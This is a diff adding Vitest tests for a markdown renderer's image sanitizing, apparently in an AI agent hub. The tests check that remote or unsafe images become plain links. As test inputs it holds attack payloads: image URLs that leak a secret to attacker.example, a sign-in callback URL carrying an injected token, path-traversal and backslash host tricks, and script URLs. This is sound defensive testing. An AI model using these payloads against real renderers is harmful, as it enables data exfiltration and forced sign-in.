@@ -1,5 +1,5 @@
 import { describe, expect, it } from "vitest";
-import { renderMarkdown } from "./markdown";
+import { IMAGE_LINK_KIND, renderMarkdown } from "./markdown";
 
 /** The rendered nodes in a container, so a test can query them. */
 function html(content: string, pathHref?: (path: string) => string): HTMLElement {
@@ -64,6 +64,172 @@ describe("renderMarkdown links", () => {
   it("still drops a script URL", () => {
     const root = html("[bad](javascript:alert(1))");
     expect(root.querySelector("a[href^='javascript']")).toBeNull();
+  });
+});
+
+describe("renderMarkdown images", () => {
+  /** The rendered fragment as the sanitizer hands it over, before anything inserts it into the page. */
+  function fragment(content: string): DocumentFragment {
+    return renderMarkdown(content);
+  }
+
+  it("shows an image from another server as a link to it, naming its alt text", () => {
+    const nodes = fragment("![the secret](https://attacker.example/x.png?d=hunter2)");
+    expect(nodes.querySelector("img")).toBeNull();
+    const link = nodes.querySelector<HTMLAnchorElement>("a.prose-image-link");
+    expect(link?.getAttribute("href")).toBe("https://attacker.example/x.png?d=hunter2");
+    expect(link?.getAttribute("target")).toBe("_blank");
+    expect(link?.getAttribute("rel")).toBe("noopener noreferrer");
+    expect(link?.textContent).toBe(`${IMAGE_LINK_KIND} the secret`);
+  });
+
+  it("names the URL when the image has no alt text", () => {
+    const link = fragment("![](https://attacker.example/x.png)").querySelector(".prose-image-link");
+    expect(link?.textContent).toBe(`${IMAGE_LINK_KIND} https://attacker.example/x.png`);
+  });
+
+  it.each([
+    ["raw HTML", '<img src="https://attacker.example/x.png" alt="pic">'],
+    ["a protocol-relative URL", '<img src="//attacker.example/x.png" alt="pic">'],
+    ["plain http", "![pic](http://attacker.example/x.png)"],
+    ["a reference image", "![pic][r]\n\n[r]: https://attacker.example/x.png"],
+  ])("does the same for %s", (_name, markup) => {
+    const nodes = fragment(markup);
+    expect(nodes.querySelector("img")).toBeNull();
+    expect(nodes.querySelector(".prose-image-link")?.textContent).toBe(`${IMAGE_LINK_KIND} pic`);
+  });
+
+  it("turns a remote image inside a link into text, leaving the one link", () => {
+    const nodes = fragment("[![badge](https://attacker.example/b.svg)](https://example.com/repo)");
+    expect(nodes.querySelector("img")).toBeNull();
+    const links = nodes.querySelectorAll("a");
+    expect(links).toHaveLength(1);
+    expect(links[0]?.getAttribute("href")).toBe("https://example.com/repo");
+    expect(links[0]?.textContent).toBe(`${IMAGE_LINK_KIND} badge`);
+  });
+
+  it.each([
+    ["an agent's shared file", "/api/agents/scout/files/3f2a9c"],
+    ["an agent's workspace file", "/api/agents/scout/files/workspace?path=charts%2Fq3.png"],
+    [
+      "an agent's file named with the page's origin",
+      `${window.location.origin}/api/agents/atlas/files/abc`,
+    ],
+    ["a data URI", "data:image/png;base64,iVBORw0KGgo="],
+  ])("shows %s as an image", (_name, src) => {
+    const nodes = fragment(`![chart](${src})`);
+    expect(nodes.querySelector(".prose-image-link")).toBeNull();
+    const image = nodes.querySelector("img");
+    expect(image?.getAttribute("src")).toBe(src);
+    expect(image?.getAttribute("alt")).toBe("chart");
+  });
+
+  it.each([
+    [
+      "the Cloud sign-in callback, which signs the hub in on a GET",
+      "/cloud/callback?token=attacker",
+    ],
+    ["another hub route", "/api/hub/push/key"],
+    ["a relative path", "chart.png"],
+    [
+      "a path that climbs out of the file routes",
+      "/api/agents/scout/files/../../../cloud/callback?token=x",
+    ],
+    ["an agent's files route with nothing after it", "/api/agents/scout/files/"],
+    ["an agent file path on another server", "https://attacker.example/api/agents/scout/files/abc"],
+  ])("shows %s as a link, requesting nothing", (_name, src) => {
+    const nodes = fragment(`![pic](${src})`);
+    expect(nodes.querySelector("img")).toBeNull();
+    const link = nodes.querySelector(".prose-image-link");
+    expect(link?.getAttribute("href")).toBe(src);
+    expect(link?.textContent).toBe(`${IMAGE_LINK_KIND} pic`);
+  });
+
+  it.each([
+    ["a backslash the URL parser reads as another host", String.raw`/\attacker.example/x.png`],
+    ["two backslashes", String.raw`\\attacker.example/x.png`],
+    [
+      "an encoded climb out of the file routes",
+      "/api/agents/scout/files/%2e%2e/%2e%2e/%2e%2e/cloud/callback?token=x",
+    ],
+    [
+      "an agent file path behind a user name on another host",
+      `${window.location.protocol}//${window.location.host}@attacker.example/api/agents/scout/files/a`,
+    ],
+  ])("shows %s, written as raw HTML, as a link", (_name, src) => {
+    const nodes = fragment(`<img src="${src}" alt="pic">`);
+    expect(nodes.querySelector("img")).toBeNull();
+    const link = nodes.querySelector(".prose-image-link");
+    expect(link?.getAttribute("href")).toBe(src);
+    expect(link?.textContent).toBe(`${IMAGE_LINK_KIND} pic`);
+  });
+
+  it.each([
+    ["a script URL", '<img src="javascript:alert(1)" alt="pic">'],
+    [
+      "a blob URL, which names nothing outside the page that made it",
+      '<img src="blob:https://example.com/5d1c" alt="pic">',
+    ],
+    ["an empty source", '<img src="" alt="pic">'],
+    ["no source", '<img alt="pic">'],
+  ])("names an image with %s in words, with nothing to open", (_name, markup) => {
+    const nodes = fragment(markup);
+    expect(nodes.querySelector("img, a")).toBeNull();
+    expect(nodes.querySelector("span.prose-image-link")?.textContent).toBe(
+      `${IMAGE_LINK_KIND} pic`,
+    );
+  });
+
+  it("drops a template and the image it holds", () => {
+    const nodes = fragment(
+      '<template><img src="https://attacker.example/t.png"></template><p>text</p>',
+    );
+    expect(nodes.querySelector("template")).toBeNull();
+    expect(nodes.textContent.trim()).toBe("text");
+  });
+
+  it.each([
+    ["opens with a frameset", "<frameset><frame src=x></frameset> hi"],
+    ["opens with spaces and a frameset", "  <frameset></frameset> hi"],
+  ])("shows a reply that %s as its plain text", (_name, content) => {
+    const root = document.createElement("div");
+    root.append(renderMarkdown(content));
+    expect(root.textContent).toBe(content);
+    expect(root.querySelector("frameset, frame")).toBeNull();
+  });
+
+  it.each([
+    [
+      "video",
+      '<video src="https://attacker.example/v.mp4" poster="https://attacker.example/p.png">clip</video>',
+    ],
+    ["audio", '<audio src="https://attacker.example/a.mp3">sound</audio>'],
+    [
+      "video sources and tracks",
+      '<video><source src="https://attacker.example/v.mp4"><track src="https://attacker.example/t.vtt">clip</video>',
+    ],
+    [
+      "picture and its sources",
+      '<picture><source srcset="https://attacker.example/p.png"><img src="/api/agents/scout/files/p.png" alt="pic"></picture>',
+    ],
+    [
+      "an image map",
+      '<map name="m"><area href="https://attacker.example/" shape="rect" coords="0,0,1,1" alt="spot"></map>',
+    ],
+  ])("drops %s", (_name, markup) => {
+    const nodes = fragment(markup);
+    expect(nodes.querySelector("video, audio, source, track, picture, map, area")).toBeNull();
+    expect(nodes.querySelector("[src^='https:'], [srcset], [poster]")).toBeNull();
+  });
+
+  it("drops srcset from an image and background from a table, which load URLs too", () => {
+    const nodes = fragment(
+      '<img src="/api/agents/scout/files/a.png" srcset="https://attacker.example/a.png 2x" alt="a">' +
+        '<table background="https://attacker.example/t.png"><tr><td background="https://attacker.example/c.png">cell</td></tr></table>',
+    );
+    expect(nodes.querySelector("img")?.getAttribute("src")).toBe("/api/agents/scout/files/a.png");
+    expect(nodes.querySelector("[srcset], [background]")).toBeNull();
+    expect(nodes.querySelector("td")?.textContent).toBe("cell");
   });
 });
 
@@ -198,7 +364,7 @@ describe("renderMarkdown raw HTML", () => {
 
   it("drops every inline style, so nothing can be placed over the app", () => {
     const root = html(
-      '<div style="position:fixed;inset:0;background:red">cover</div><p style="color:red">red</p><img src="https://example.com/i.png" style="position:absolute" alt="pic">',
+      '<div style="position:fixed;inset:0;background:red">cover</div><p style="color:red">red</p><img src="/api/agents/scout/files/i.png" style="position:absolute" alt="pic">',
     );
     expect(root.querySelector("[style]")).toBeNull();
     expect(words(root)).toBe("coverred");
